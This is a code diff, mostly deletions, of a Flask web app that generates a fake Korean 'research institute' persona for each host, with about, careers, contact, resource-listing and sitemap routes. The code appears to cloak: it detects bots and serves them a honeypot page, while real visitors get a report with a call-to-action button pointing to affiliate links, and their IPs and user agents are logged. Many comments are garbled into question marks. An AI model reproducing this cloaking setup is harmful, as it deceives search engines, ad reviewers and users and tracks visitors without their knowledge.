-            <h1 style="color:{cham['theme']['color']}; border-bottom:3px solid {cham['theme']['color']}; display:inline-block;">{cham['name']}</h1>
-            <p style="margin-top:10px; font-weight:bold;">{cham['doc_id']} 기술 표준 통합 관리 포털</p>
-            <div style="margin-top:15px; font-size:12px; color:#94a3b8;">최종 업데이트: 2026-01-27 | 관할 부서: 기술인프라 운영본부</div>
-        </div>
-        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap:20px;">
-            {"".join(selected_cards)}
-        </div>
-        """
-        resp = Response(render_template_string(BASE_HTML, title=cham['name'], body_content=body, site_name=cham['name'], theme_color=cham['theme']['color'], site_desc=cham['doc_id'], ga_id=GA_ID, font_family=cham['font'], identity=cham, terms={"about": "연구소 소개", "resources": "기술자료"}, cls_nav="n_main", cls_footer="f_main", cls_content="c_main"))
-        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
-        return resp
-
-    # ?? [CASE 2] ??? ??? -> [???] ??? ??? ???????????. ??????????????? ????? ???.
-    selected_data = None
-    category_key = "cleaning"
-    for cat, data in DATA_MAP.items():
-        if any(k in keyword for k in data['keywords']):
-            selected_data = data
-            category_key = cat
-            break
-    if not selected_data:
-        selected_data = DATA_MAP["cleaning"]
-    
-    final_url = selected_data['link_A'] # ??? A??? ?????
-    if type_code == 'B': final_url = selected_data['link_B']
-    
-    send_trace(f"[V35_3_STABLE_ASCII] Code: {keyword_raw} | Key: {keyword} ({category_key}) | IP: {user_ip} | UA: {ua[:50]}... | Link: {final_url}")
-    
-    # ?? [v20.0] ??????????????? ??? ????????????? (주)? ??? ???)
-    resp = Response(get_professional_report(host, category_key, show_cta=True, target_url=final_url))
-    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
-    return resp
-
-@app.route('/resources')
-def resources():
-    host = request.host.split(':')[0].replace('www.', '')
-    cham = get_chameleon_data(host)
-    page = request.args.get('page', 1, type=int)
-    per_page = 10
-    total_docs = len(DOC_DATABASE)
-    total_pages = (total_docs + per_page - 1) // per_page
-    start = (page - 1) * per_page
-    end = start + per_page
-    docs = DOC_DATABASE[start:end]
-
-    list_html = ""
-    for d in docs:
-        list_html += f"""
-        <div style="padding:22px; border-bottom:1px solid #eee;">
-            <a href="/a/{d['cat']}" style="text-decoration:none; color:{cham['theme']['color']}; font-weight:bold;">[{d['id']}] {d['title']}</a>
-            <p style="font-size:13px; color:#666; margin-top:8px;">{d['desc']}</p>
-        </div>
-        """
-    
-    pagination_html = '<div class="pagination">'
-    for p in range(1, total_pages + 1):
-        active_class = 'active' if p == page else ''
-        pagination_html += f'<a href="/resources?page={p}" class="{active_class}">{p}</a>'
-    pagination_html += '</div>'
-
-    content = f"""
-    <div class="section">
-        <h1 style="color:{cham['theme']['color']}; border-bottom:3px solid {cham['theme']['color']}; display:inline-block;">기술 자료실</h1>
-        <div style="margin-top:20px;">{list_html}</div>
-        {pagination_html}
-    </div>
-    """
-    return render_template_string(BASE_HTML, title="기술 자료실", body_content=content, site_name=cham['name'], theme_color=cham['theme']['color'], ga_id=GA_ID, font_family=cham['font'], identity=cham, terms={"about": "연구소 소개", "resources": "기술자료"}, cls_nav="n_res", cls_footer="f_res", cls_content="c_res")
-
-@app.route('/about')
-def about():
-    host = request.host.split(':')[0].replace('www.', '')
-    cham = get_chameleon_data(host)
-    content = f'<div class="section"><h1>연구소 소개</h1><p style="line-height:2;">{cham["name"]}은(는) {request.host} 네트워크를 통해 설립된 고등 기술 분석 기관입니다. 우리는 산업 전반의 표준화와 효율성을 연구합니다.</p></div>'
-    return render_template_string(BASE_HTML, title="연구소 소개", body_content=content, site_name=cham['name'], theme_color=cham['theme']['color'], ga_id=GA_ID, font_family=cham['font'], identity=cham, terms={"about": "연구소 소개", "resources": "기술자료"}, cls_nav="n_ab", cls_footer="f_ab", cls_content="c_ab")
-
-@app.route('/careers')
-def careers():
-    host = request.host.split(':')[0].replace('www.', '')
-    cham = get_chameleon_data(host)
-    content = f'<div class="section"><h1>인재 채용</h1><p>{cham["name"]}와 함께 미래를 선도할 연구원을 모집합니다. 관련 전공 석/박사 학위 소지자를 우대합니다.</p></div>'
-    return render_template_string(BASE_HTML, title="인재 채용", body_content=content, site_name=cham['name'], theme_color=cham['theme']['color'], ga_id=GA_ID, font_family=cham['font'], identity=cham, terms={"about": "연구소 소개", "resources": "기술자료"}, cls_nav="n_car", cls_footer="f_car", cls_content="c_car")
-
-@app.route('/contact')
-def contact():
-    host = request.host.split(':')[0].replace('www.', '')
-    cham = get_chameleon_data(host)
-    content = f'<div class="section"><h1>연락처</h1><p>관리자 문의: admin@{host} | T. {cham["phone"]}</p></div>'
-    return render_template_string(BASE_HTML, title="연락처", body_content=content, site_name=cham['name'], theme_color=cham['theme']['color'], ga_id=GA_ID, font_family=cham['font'], identity=cham, terms={"about": "연구소 소개", "resources": "기술자료"}, cls_nav="n_con", cls_footer="f_con", cls_content="c_con")
-
-
-@app.route('/<company>/<category>')
-@app.route('/a/<category>')
-def check_visitor(category, company=None):
-    host = request.host.split(':')[0].replace('www.', '')
-    cham = get_chameleon_data(host)
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
-    ua = request.headers.get('User-Agent', '').lower()
-    
-    # ????[v19.0] ??? ????????????? ????
-    is_bot, bot_reason = is_bot_detected(user_ip, ua)
-    if is_bot:
-        return get_honeypot_response(cham)
-    
-    # ?????? ??? (주)? ??? ???????? ???)
-    target_data = DATA_MAP.get(category.lower())
-    real_url = target_data['link_A'] if target_data else "#"
-    
-    # ?? [v20.0] ?????? CPA ????? ??? ??? ??????, ??????????? ??? ?????? ?????
-    # ?? /a/ ?????????????????'???????? ?????????? ??? ??? ???????? ???????? ??????.
-    # ?????? ?? ???????? '??? ??? ???' ?????????????????????
-    show_button = not is_bot 
-    
-    resp = Response(get_professional_report(host, category.lower(), show_cta=show_button, target_url=real_url))
-    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
-    return resp
-
-# --- ????[???] ??????(Sitemap) ??? ??? ??? ---
-@app.route('/sitemap.xml')
-def sitemap():
-    conf = get_config()
-    host = request.host.split(':')[0]
-    # ??? ???????? ????? ??? ???
-    pages = [
-        {'loc': '/', 'freq': 'daily', 'pri': '1.0'},
-        {'loc': '/about', 'freq': 'monthly', 'pri': '0.5'},
-        {'loc': '/resources', 'freq': 'daily', 'pri': '0.8'},
-        {'loc': '/careers', 'freq': 'monthly', 'pri': '0.5'},
-        {'loc': '/contact', 'freq': 'monthly', 'pri': '0.5'}
-    ]
-    
-    # DB????? ??? ??????????? ??? ?????????? ???
-    categories = list(set(d['cat'] for d in DOC_DATABASE))
-    for cat in categories:
-        pages.append({'loc': f'/a/{cat}', 'freq': 'weekly', 'pri': '0.7'})
-
-    # XML ?????? ?????????
-    xml = '<?xml version="1.0" encoding="UTF-8"?>\n'
-    xml += '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
-    for p in pages:
-        xml += f'  <url>\n    <loc>https://{host}{p["loc"]}</loc>\n'
-        xml += f'    <changefreq>{p["freq"]}</changefreq>\n'
-        xml += f'    <priority>{p["pri"]}</priority>\n  </url>\n'
-    xml += '</urlset>'
-    
-    return Response(xml, mimetype='application/xml')
-
-if __name__ == "__main__":
-    app.run()
-
-def identity_gen(host):
-    return get_chameleon_data(host)
+if __name__ == "__main__": app.run()
